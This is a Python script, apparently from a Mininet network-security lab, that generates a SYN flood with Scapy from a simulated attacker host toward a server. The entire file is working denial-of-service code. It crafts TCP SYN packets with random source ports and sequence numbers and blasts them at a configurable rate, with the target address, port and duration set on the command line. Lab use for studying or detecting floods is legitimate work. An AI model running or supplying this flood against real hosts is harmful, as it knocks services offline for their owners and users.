#!/usr/bin/env python3
"""
send_attack.py — Generador de tráfico SYN Flood.

Simula un ataque SYN Flood desde h2 (10.0.1.82, atacante) hacia h3 (servidor).

Ejecutar desde Mininet en h2:
    mininet> h2 python3 send_attack.py &

O directamente:
    python3 send_attack.py [--dst 10.0.6.1] [--pps 200] [--duration 60]
"""

import argparse
import random
from scapy.all import *

DEFAULT_DST      = '10.0.6.1'
DEFAULT_DST_PORT = 80
DEFAULT_PPS      = 200     # paquetes por segundo
DEFAULT_DURATION = 60      # segundos de ataque


def main():
    parser = argparse.ArgumentParser(description='SYN Flood attack generator')
    parser.add_argument('--dst',      default=DEFAULT_DST,      help='IP destino (servidor)')
    parser.add_argument('--dport',    type=int, default=DEFAULT_DST_PORT, help='Puerto destino')
    parser.add_argument('--pps',      type=int, default=DEFAULT_PPS,      help='Paquetes por segundo')
    parser.add_argument('--duration', type=int, default=DEFAULT_DURATION,  help='Duración en segundos')
    args = parser.parse_args()

    iface = 'eth0'
    print(f"[ATTACK] SYN Flood: {args.dst}:{args.dport} a {args.pps} pps durante {args.duration}s")
    print(f"[ATTACK] Interfaz: {iface}  |  Ctrl+C para detener\n")

    # Generar lote de paquetes SYN con IPs y puertos fuente aleatorios
    # (simula un botnet con muchas IPs, pero en la demo la IP real es h2)
    pkts = [
        Ether(src=get_if_hwaddr(iface), dst='ff:ff:ff:ff:ff:ff') /
        IP(src='10.0.1.82', dst=args.dst) /
        TCP(sport=random.randint(1024, 65535), dport=args.dport, flags='S',
            seq=random.randint(0, 2**32 - 1))
        for _ in range(args.pps * min(args.duration, 10))  # prellenar hasta 10s de paquetes
    ]

    try:
        sendpfast(pkts, pps=args.pps, loop=max(1, args.duration // 10), iface=iface)
    except Exception as e:
        print(f"[ATTACK ERROR] {e}")
        # Fallback a send() si sendpfast no está disponible
        for pkt in pkts[:args.pps]:
            send(pkt, iface=iface, verbose=False)


if __name__ == '__main__':
    main()
